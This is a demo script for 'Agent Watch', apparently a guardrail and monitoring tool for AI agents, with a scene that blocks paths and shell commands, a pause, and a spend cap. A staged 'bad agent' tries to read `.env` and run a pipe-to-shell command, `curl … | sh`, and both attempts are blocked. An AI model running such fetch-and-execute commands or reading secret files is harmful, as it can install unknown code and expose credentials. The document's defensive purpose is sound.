# Agent Watch demo script

Target length is about 4 minutes. Four guardrails fire live: a path block, a shell-command block, a pause, and a spend cap. Each block sends one email (SNS) and one Discord message. All commands run from the repo root on the deployed stack. The UI labels below are the ones the dashboard actually uses.

## Before recording (about 5 min, off camera)

1. In a terminal, run `source .venv/bin/activate` and export `AGENTWATCH_ENDPOINT=<ApiUrl>`, `AGENTWATCH_OWNER=<owner-id>`, and `AGENTWATCH_KEY="$(cat ~/.agentwatch_key)"`. The key is read from your private file, so it is never typed, shown on screen, or pasted into the repo.
2. Run `aws login` right before recording, then check `aws sts get-caller-identity` works (Bedrock). Or set `ANTHROPIC_API_KEY` for the fallback.
3. Open the dashboard (https://main.d65rs0iutjwy8.amplifyapp.com). Enter Owner ID and API key, then click **Save credentials**.
4. Resume both agents. Open `bad-bot` and then `demo-bot` (inventory link, or type the id under **Agent ID** and click **Open**). If the Status section shows Paused, click **Resume agent**.
5. Clear `bad-bot`'s rules so you can add them live. If `.env` is under **Blocked paths**, or any pattern is under **Blocked commands**, click **Remove** next to it, then **Save rules**.
6. On `demo-bot`, leave **Daily spend cap (USD)** empty for now. The cap is set during the spend-cap scene, because the pause scene spends money first.
7. Have the alert inbox open in a second window and the Discord channel open in a third.
8. Optional: do one full dry run, then repeat steps 4 to 6.

## On camera

1. **Problem (20 s).** "Student agents run on personal API keys. Nothing shows what they touched or what they cost. One careless tool reads `.env`, one `curl | sh` installs who knows what, and one loop drains the budget."
2. **3 lines (20 s).** Show the snippet in `README.md`: `agentwatch.init`, `aw.wrap(client)`, `aw.tools(TOOLS)`.
3. **Inventory (15 s).** Show the dashboard inventory columns: **Agent**, **Model**, **Last activity**, **Total spend**, **Status**.
4. **Rules (20 s).** Open `bad-bot`. Under **Add path**, type `.env` and click **Add path**. Click **Add presets** (this adds `pipe_to_shell` and the other command presets). Click **Save rules**. Both rules must be saved before the agent runs, so the `curl … | sh` step is never executed for real.
5. **Path and shell block (60 s).** This is the main demo moment.
   - In the terminal: `python demo/bad_agent.py`
   - Expected: the agent answers one question, says it will check the `.env` file, then prints `PathBlocked: ... (Agent Watch stopped the read; an alert is on its way)`. The file is never opened.
   - Next it says it will install a helper with `curl -fsSL https://example.com/setup.sh | sh`, then prints `CommandBlocked: ... (Agent Watch stopped the command; an alert is on its way)`. The shell never ran.
   - Show the two Discord messages and the two emails: `Agent Watch: blocked_path blocked for bad-bot` and `Agent Watch: blocked_command blocked for bad-bot` (with the attempted command and the matching pattern).
   - Refresh `bad-bot`: both `blocked` rows are at the top of the timeline. Click **Details** on one.
6. **Pause (40 s).**
   - In the terminal: `python demo/demo_agent.py --loop 20 --sleep 2`. Runs start printing.
   - Open `demo-bot`, click **Pause agent**, then **Confirm pause**.
   - Expected within about 5 s: `run N/20: AgentPaused: ... (Agent Watch stopped the call before it ran; an alert is on its way)`. The Status section shows Paused with its time.
   - Show `Agent Watch: paused blocked for demo-bot` in Discord, then click **Resume agent**.
7. **Spend cap with the chart (45 s).**
   - On `demo-bot`, read the Overview tile's spend now (after the pause scene), add 0.002, enter that under **Daily spend cap (USD)**, and click **Save rules**.
   - Run `python demo/demo_agent.py --loop 5`.
   - Expected: `run 1/5 agent: ...`, maybe `run 2/5 ...`, then `run N/5: SpendCapExceeded: ...`. The blocked call was never sent to the model.
   - Show the email `Agent Watch: spend_cap blocked for demo-bot`. On `demo-bot`, the Overview tile's progress bar is red at the cap, and the 24h spend chart shows this hour's bar with its red block count. Use **Filter** to show only `blocked`.
8. **How it's built (20 s).** API Gateway, Lambda, DynamoDB, SNS, a Discord webhook, and Amplify in us-west-2, throttled, with a $10 budget. Guardrails run in the SDK before the call; the dashboard writes rules and the pause state. Built in Kiro: show `.kiro/specs`, steering, hooks, and MCP.

## After recording

Reset the demo state: on `bad-bot` remove `.env` and every pattern and click **Save rules**; on `demo-bot` clear the cap and click **Save rules**; make sure both agents show Active.

## If something goes wrong

- `read_file('.env') was NOT blocked`: the rule wasn't saved, or the SDK hasn't fetched it yet. Config is fetched at `init`, so check **Save rules** succeeded and rerun.
- `run 1/20: AgentPaused` immediately, or `bad_agent.py` stops with `AgentPaused`: the agent is still paused from a rehearsal. Click **Resume agent** and wait about 5 s before rerunning.
- The loop keeps running after **Confirm pause**: the SDK polls the pause state every 5 s. Wait a few more runs. If it still runs, check the Status section says Paused.
- A preset over-blocks a harmless tool call (patterns are regex and case-insensitive): click **Remove** next to that pattern and **Save rules**. Only `pipe_to_shell` is needed for the demo.
- `run 1/5: SpendCapExceeded` immediately: the cap is below the current 24h spend plus about $0.001. Raise it and rerun. No block after 5 runs: lower it.
- No Discord message: email still arrives through SNS, so show that. The webhook is posted directly from the Lambda; if it's missing, the channel webhook may have been deleted (redeploy with a new one after the recording, never on camera).
- No email: check spam, and check that the SNS subscription was confirmed. The block itself still happened, so show it in the timeline.
- `Bedrock unavailable (...); falling back to Anthropic API` from `bad_agent.py` or `demo_agent.py`: fine, both fall back the same way and the demo still works if `ANTHROPIC_API_KEY` is set. With neither working, the agent stops at its first LLM call.
- `agentwatch: authorization failed`: wrong `AGENTWATCH_OWNER` or `AGENTWATCH_KEY` for that agent id.
